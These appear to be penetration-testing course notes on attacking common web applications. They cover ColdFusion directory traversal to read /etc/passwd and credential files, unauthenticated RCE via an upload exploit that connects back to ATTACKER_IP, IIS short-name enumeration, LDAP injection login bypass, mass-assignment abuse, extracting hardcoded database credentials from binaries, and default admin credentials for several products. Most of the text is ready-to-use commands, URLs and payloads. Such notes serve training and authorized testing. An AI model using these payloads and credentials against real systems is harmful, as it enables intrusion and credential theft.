`CVE-2013-0632` RCE | `CVE-2013-0629` directory traversal + file disclosure | `CVE-2010-2861` directory traversal + arbitrary file read | `CVE-2018-15961` arbitrary file upload leading to RCE | `CVE-2023-26360` pre-auth RCE

`80` HTTP | `443` HTTPS | `1935` RPC | `25` SMTP | `8500` SSL | `5500` Server Monitor, remote admin

### Enumeration

Indicators: `.cfm`/`.cfc` extensions, `Server: ColdFusion` or `X-Powered-By: ColdFusion` headers, ColdFusion-specific error messages, default files (`CFIDE/administrator/index.cfm`).

```bash
nmap -p- -sC -Pn <TARGET_IP> --open
```

`/CFIDE/administrator` loads the ColdFusion Administrator login page, which can reveal the major version.

## Attacking ColdFusion

Searchsploit-driven exploitation of a fingerprinted ColdFusion version for file read or RCE.

```bash
searchsploit adobe coldfusion
searchsploit -p <EDB_ID> # show exploit path, copies to clipboard
cp /usr/share/exploitdb/exploits/<PATH> .
```

### Directory Traversal

CVE-2010-2861 affects ColdFusion ≤9.0.1 via the `locale` parameter in several `.cfm` files, no auth required to read arbitrary files:

`CFIDE/administrator/settings/mappings.cfm`, `logging/settings.cfm`, `datasources/index.cfm`, `j2eepackaging/editarchive.cfm`, `CFIDE/administrator/enter.cfm`

```http
http://<TARGET_DOMAIN>/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

```bash
python2 14641.py <TARGET_IP> <PORT> "<TRAVERSAL_PATH>/lib/password.properties"
```

`password.properties` (in `[cf_root]/lib`) stores encrypted service credentials (DB, mail, LDAP).

### Unauthenticated RCE

CVE-2009-2265: Adobe ColdFusion ≤8.0.1, FCKeditor file upload with no auth.

```http
http://<TARGET_DOMAIN>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

Exploit script needs `lhost`, `lport`, `rhost`, `rport` set before running.

```python
lhost = '<ATTACKER_IP>'
lport = <PORT>
rhost = "<TARGET_IP>"
rport = <PORT>
```

```bash
python3 50057.py
```

## IIS Tilde Enumeration

Exploits IIS's 8.3 short-name generation to enumerate hidden files/directories via the `~` character in a URL (e.g. `/~s`, `/~se`, `/~sec` narrows to `secret~1`).

```bash
nmap -p- -sV -sC --open <TARGET_IP>
```

### Tilde Enumeration using IIS ShortName Scanner

Requires Oracle Java installed.

```bash
java -jar iis_shortname_scanner.jar 0 5 http://<TARGET_IP>/
```

### Generate Wordlist

Build a targeted wordlist from a known short-name prefix to brute force the full filename.

```bash
egrep -r ^<PREFIX> /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

### Gobuster Enumeration

```bash
gobuster dir -u http://<TARGET_IP>/ -w /tmp/list.txt -x .aspx,.asp
```

## LDAP

Protocol for accessing/managing directory services, not itself a directory service (AD is one implementation using LDAP). Default port 389 (LDAP) or 636 (LDAPS). No encryption by default, needs LDAPS or StartTLS.

### ldapsearch

Command-line utility to query an LDAP directory.

```bash
ldapsearch -H ldap://<TARGET_DOMAIN>:389 -D "cn=<USERNAME>,dc=<DOMAIN>,dc=com" -w <PASSWORD> -b "ou=people,dc=<DOMAIN>,dc=com" "(mail=<EMAIL>)"
```

`-H` server URI | `-D` bind DN | `-w` bind password | `-b` search base DN

### LDAP Injection

Malicious users manipulate LDAP queries via special characters to bypass authentication or access unauthorized data: `*` any chars, `( )` group expressions, `|` logical OR, `&` logical AND, `(cn=*)` always-true condition.

```php
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```

Injecting `*` into either the username or password field can bypass authentication entirely.

### Enumeration

```bash
nmap -p- -sC -sV --open --min-rate=1000 <TARGET_IP>
```

An OpenLDAP service alongside a web login page suggests the web app authenticates via LDAP.

### Injection

Logging in with `*` as both username and password bypasses authentication on an LDAP-backed login form.

## Web Mass Assignment Vulnerabilities

Frameworks that auto-bind form/POST data to model objects can let an attacker set fields never shown in the form (e.g. `admin`, `confirmed`) if the backend doesn't whitelist allowed fields.

Ruby on Rails example, only `username`/`email` are intended to be settable, but an attacker can still add `admin` since Rails binds whatever is present in the POST body:

```javascript
{ "user" => { "username" => "hacker", "email" => "hacker@example.com", "admin" => true } }
```

### Exploiting Mass Assignment Vulnerability

If a registration flow checks a backend `confirmed`/approval flag, adding an unexpected `confirmed` parameter to the POST body (any value, via Burp) can flip it to true and bypass admin approval.

```text
username=<USERNAME>&password=<PASSWORD>&confirmed=<ANY_VALUE>
```

### Prevention

Rails strong parameters, explicitly whitelist permitted fields.

```ruby
def user_params
  params.require(:user).permit(:username, :email)
end
```

## Attacking Applications Connecting to Services

Local binaries that connect to backend services (DBs, APIs) may have connection strings/credentials hardcoded or recoverable via debugging.

### ELF Executable Examination

GDB + PEDA to find a hardcoded SQL connection string passed to `SQLDriverConnect`.

```bash
gdb ./<BINARY>
set disassembly-flavor intel
disas main          # locate the call to SQLDriverConnect
b *<ADDRESS>         # address of the SQLDriverConnect call
run                  # connection string appears in a register (e.g. RDX) at the breakpoint
```

Credentials recovered this way are also worth testing for reuse against other services/users on the network.

### DLL File Examination

.NET DLLs can be inspected for connection strings/credentials.

```powershell
Get-FileMetaData .\<FILE>.dll
```

`dnSpy` opens, decompiles, and debugs .NET assemblies (C#/VB) to read source directly (e.g. a controller class holding a DB connection string with a password).

## Other Notable Applications

Applies the same discovery/enumeration/abuse mindset to any unfamiliar application, default credentials and built-in functionality are often enough.

### Honorable Mentions

#### Axis2

Often sits on top of Tomcat. Check for weak/default admin creds, then upload a web shell as an AAR (Axis2 service) file. Metasploit module available.

#### Websphere

Default creds such as `system:manager` on the admin console allow WAR file deployment for RCE, like Tomcat.

#### Elasticsearch

History of vulnerabilities, worth checking forgotten/old instances.

#### Zabbix

Open-source monitoring, history of SQLi, auth bypass, stored XSS, LDAP password disclosure, RCE. Built-in API functionality can also be abused for RCE.

#### Nagios

Monitoring tool, history of RCE, root privesc, SQLi, code injection, stored XSS. Check default creds `nagiosadmin:PASSW0RD` and fingerprint the version.

#### WebLogic

Java EE app server, many unauthenticated RCEs (2007–2021), largely Java deserialization vulnerabilities.

#### Wikis/Intranets

MediaWiki, SharePoint, custom intranets, check for known vulns and a search function that may expose credentials or a document repository.

#### DotNetNuke

C#/.NET open-source CMS (DNN). History of auth bypass, directory traversal, stored XSS, file upload bypass, arbitrary file download.

#### vCenter

Manages ESXi fleets. Check weak creds and vulnerabilities like the Apache Struts 2 RCE and the unauthenticated OVA upload (`CVE-2021-22005`). Windows appliance privesc often trivial (e.g. JuicyPotato). Sometimes already running as SYSTEM or domain admin.